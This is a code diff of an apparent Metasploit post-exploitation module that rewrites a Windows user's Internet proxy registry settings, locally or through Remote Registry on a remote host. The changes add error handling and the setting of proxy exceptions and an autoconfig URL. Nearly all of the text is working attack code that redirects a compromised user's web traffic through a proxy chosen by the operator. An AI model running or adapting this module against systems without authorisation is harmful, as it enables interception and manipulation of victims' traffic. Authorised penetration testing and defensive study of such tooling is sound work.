@@ -10,13 +10,13 @@ require 'msf/core/post/windows/services'
 
 class Metasploit3 < Msf::Post
 
-	DEBUG = false
-
         include Post::Windows::Services
+
+	DEBUG = false
 
         def initialize
                 super(
-                        'Name'        => 'Windows Gather Proxy Setting (BETA)',
+                        'Name'        => 'Windows Set Proxy Setting (BETA)',
                         'Description'    => %q{
                                 This module pulls a user's proxy settings. If neither RHOST or SID
                                 are set it pulls the current user, else it will pull the user's settings
@@ -33,25 +33,22 @@ class Metasploit3 < Msf::Post
 
                 register_options(
                         [
-                                OptAddress.new('RHOST',        [ false, 'Remote host to clone settings to, defaults to local' ]),
-                                OptString.new('SID',           [ false, 'SID of user to clone settings to (SYSTEM is S-1-5-18)' ]),
-                                OptString.new('SINGLEPROXY',   [ false, 'Provide HOST:PORT setting of proxy server for all protocols']),
-                                OptString.new('HTTPPROXY',     [ false, 'Provide HOST:PORT setting of proxy server for HTTP protocols']),
-                                OptString.new('HTTPSPROXY',    [ false, 'Provide HOST:PORT setting of proxy server for HTTPS protocols']),
-                                OptString.new('FTPPROXY',      [ false, 'Provide HOST:PORT setting of proxy server for FTP protocols']),
-                                OptString.new('SOCKSPROXY',    [ false, 'Provide HOST:PORT setting of proxy server for SOCKS protocols']),
-                                OptString.new('AUTOCONFIGURL', [ false, 'Provide URL to configuration file for AutoConfig functionality']),
-                                OptString.new('EXCEPTIONS',    [ false, 'Exclude proxying for hosts beginning with (semicolon-delimited)']),
-                                OptBool.new('WPAD',            [ true, 'Enable/disable WPAD.  ("Automatically detect settings")']),
-                                OptBool.new('AUTOCONFIG',      [ true, 'Enable/disable AutoConfig. ("Use automatic configuration script")']),
-                                OptBool.new('ENABLE',          [ true, 'Enable/disable proxy server. ("Use a proxy server for your LAN")'])
+                                OptAddress.new('RHOST',         [ false, 'Remote host to clone settings to, defaults to local' ]),
+                                OptString.new( 'SID',           [ false, 'SID of user to clone settings to (SYSTEM is S-1-5-18)' ]),
+                                OptString.new( 'SINGLEPROXY',   [ false, 'Provide HOST:PORT setting of proxy server for all protocols']),
+                                OptString.new( 'HTTPPROXY',     [ false, 'Provide HOST:PORT setting of proxy server for HTTP protocols']),
+                                OptString.new( 'HTTPSPROXY',    [ false, 'Provide HOST:PORT setting of proxy server for HTTPS protocols']),
+                                OptString.new( 'FTPPROXY',      [ false, 'Provide HOST:PORT setting of proxy server for FTP protocols']),
+                                OptString.new( 'SOCKSPROXY',    [ false, 'Provide HOST:PORT setting of proxy server for SOCKS protocols']),
+                                OptString.new( 'AUTOCONFIGURL', [ false, 'Provide URL to configuration file for AutoConfig functionality']),
+                                OptString.new( 'EXCEPTIONS',    [ false, 'Exclude proxying for hosts beginning with (semicolon-delimited)']),
+                                OptBool.new(   'WPAD',          [ true,  'Enable/disable WPAD.  ("Automatically detect settings")']),
+                                OptBool.new(   'AUTOCONFIG',    [ true,  'Enable/disable AutoConfig. ("Use automatic configuration script")']),
+                                OptBool.new(   'ENABLE',        [ true,  'Enable/disable proxy server. ("Use a proxy server for your LAN")'])
                         ], self.class)
         end
 
         def run
-		# Check if ENABLE is TRUE, but all strings are blank.  Error out.
-		# Check if SINGLEPROXY is set, as well as any other PROXY string.  If so, error out.
-
                 if datastore['SID']
                         root_key, base_key = session.sys.registry.splitkey("HKU\\#{datastore['SID']}\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections")
                 else
@@ -82,20 +79,29 @@ class Metasploit3 < Msf::Post
                         open_key = session.sys.registry.create_key(root_key, base_key, KEY_WRITE + KEY_READ + 0x0000)
                 end
 
-                values = open_key.query_value('DefaultConnectionSettings')		# ERROR CHECKING TO MAKE SURE THE KEY EXISTS
+		# Get current proxy configuration
+		begin
+	                values = open_key.query_value('DefaultConnectionSettings')
+		rescue
+			print_error "FATAL ERROR: Unable to read registry key.  (Does the key exist?)  Aborting."
+	                service_stop('RemoteRegistry',datastore['RHOST']) if startedreg
+			return -1
+		end
+			
 		print_status "----- PREVIOUS SETTINGS -----"
 		retVal = queryProxy(values.data)
 		if not retVal
-			print_error "FATAL ERROR: Unrecognized proxy configuration.  Aborting."
+			print_error "FATAL ERROR: Unrecognized proxy configuration.  (Did you break it?)  Aborting."
 	                service_stop('RemoteRegistry',datastore['RHOST']) if startedreg
 			return -1
 		end
 
-                newSettings = configureProxy(values.data) if not datastore['READONLY']
+		# Push user-supplied proxy configuration (and display the results)
+                newSettings = configureProxy(values.data)
 		print_status "-----   NEW SETTINGS   -----"
 		queryProxy(newSettings) if newSettings
 
-                #If we started the service we need to stop it.
+                # If we started the Remote Registry service, we need to stop it.
                 service_stop('RemoteRegistry',datastore['RHOST']) if startedreg
 
 		print "\n"
@@ -106,8 +112,17 @@ class Metasploit3 < Msf::Post
 
 		new = current
 
+		# Toggle the checkboxes according to user input (Proxy server, Autoconfig, WPAD)
 		new = configureProxySetting(new)
+
+		# Modify the IP/hosts for the proxy server (all, HTTP, HTTPS, FTP, Gopher, SOCKS)
 		new = configureProxyIPs(new)
+
+		# Add proxy exceptions for hosts beginning with...
+		new = configureExceptions(new)
+
+		# Specify a URL for Autoconfig functionality
+		new = configureAutoconfigUrl(new)
 
 		if new
 	        	retVal = registry_setvaldata(internetSettings_key,'DefaultConnectionSettings',new.to_s(),"REG_BINARY")
@@ -162,7 +177,7 @@ class Metasploit3 < Msf::Post
 
                 cursor = cursor + 4 + (data[cursor].unpack('C*'))[0]
                 additionalinfo = data[cursor+4, (data[cursor,1].unpack('C*'))[0]]
-                print_status "Additional Info: #{additionalinfo}" if additionalinfo != ""
+                print_status "Exceptions:    #{additionalinfo}" if additionalinfo != ""
 
                 cursor = cursor + 4 + (data[cursor].unpack('C*'))[0]				
                 autoconfigurl = data[cursor+4, (data[cursor,1].unpack('C*'))[0]]
@@ -225,7 +240,7 @@ class Metasploit3 < Msf::Post
 			print_error "FATAL ERROR: SINGLEPROXY cannot be defined with other proxies.  Aborting."
 			return false
 		elsif datastore['SINGLEPROXY']
-
+			# Remove any existing proxy servers
 			new = clearProxyIPs(new)
 
 			# Insert the string containing the new proxy server
@@ -234,6 +249,9 @@ class Metasploit3 < Msf::Post
 			# Set proxy length value to match length of user-supplied value
 			new[12] = datastore['SINGLEPROXY'].length.to_i.chr
 		else
+
+			# Build the semicolon-delimited list of proxy servers from the user input
+			#   e.g. http=192.168.0.250:8080;socks=192.168.0.253:1023;
 			proxyServers = ""
 			if datastore['HTTPPROXY']
 				proxyServers += "http=#{datastore['HTTPPROXY']};"
@@ -250,6 +268,8 @@ class Metasploit3 < Msf::Post
 			if datastore['SOCKSPROXY']
 				proxyServers += "socks=#{datastore['SOCKSPROXY']};"
 			end
+
+			# Remove any existing proxy servers
 			new = clearProxyIPs(new)
 
 			# Insert the string containing the new proxy server
@@ -262,7 +282,6 @@ class Metasploit3 < Msf::Post
 	end
 
 	def configureProxySetting(new)
-		
 		byte = 1
 
 		if datastore['ENABLE']
@@ -287,6 +306,64 @@ class Metasploit3 < Msf::Post
 		end
 
 		new[8] = byte.chr
+		return new
+	end
+
+	def configureExceptions(new)
+		# Calculate the location of the relevant offsets and values
+		currentServerLength    = new[12].ord
+		currentServerStop      = 16 + currentServerLength
+
+		print_error "--- EXCEPTIONS ---" if DEBUG
+		base      = currentServerStop
+		print_error "BASE: #{base}" if DEBUG
+		lengthPos = base
+		print_error "LENPOS:#{lengthPos}" if DEBUG
+		length    = new[lengthPos].ord
+		print_error "LENGTH:#{length} " if DEBUG
+		start     = lengthPos + 4
+		print_error "START: #{start}" if DEBUG
+		stop      = start + length + 1
+		print_error "STOP:  #{stop}" if DEBUG
+
+		# Trim the old setting
+		new = new[0..start] + new[stop,9999].to_s
+
+		# Insert the string containing the user-supplied value
+		new.insert(start, datastore['EXCEPTIONS'].to_s)
+
+		# Set proxy length value to match length of user-supplied value
+		new[lengthPos] = datastore['EXCEPTIONS'].to_s.length.chr
+		return new
+	end
+
+	def configureAutoconfigUrl(new)
+		# Calculate the location of the relevant offsets and values
+		currentServerLength    = new[12].ord
+		currentServerStop      = 16 + currentServerLength
+		currentExceptionLength = new[currentServerStop].ord
+		currentExceptionStop   = currentServerStop + 4 + currentExceptionLength
+
+		print_error "--- AUTOCONFIG ---" if DEBUG
+		base      = currentExceptionStop
+		print_error "BASE: #{base}" if DEBUG
+		lengthPos = base
+		print_error "LENPOS:#{lengthPos}" if DEBUG
+		length    = new[lengthPos].ord
+		print_error "LENGTH:#{length} " if DEBUG
+		start     = lengthPos + 4
+		print_error "START: #{start}" if DEBUG
+		stop      = start + length + 1
+		print_error "STOP:  #{stop}" if DEBUG
+
+		# Trim the old setting
+		new = new[0..start] + new[stop,9999].to_s
+
+		# Insert the string containing the user-supplied value
+		new.insert(start, datastore['AUTOCONFIGURL'].to_s)
+
+		# Set proxy length value to match length of user-supplied value
+		new[lengthPos] = datastore['AUTOCONFIGURL'].to_s.length.chr
 		return new
 	end
 end
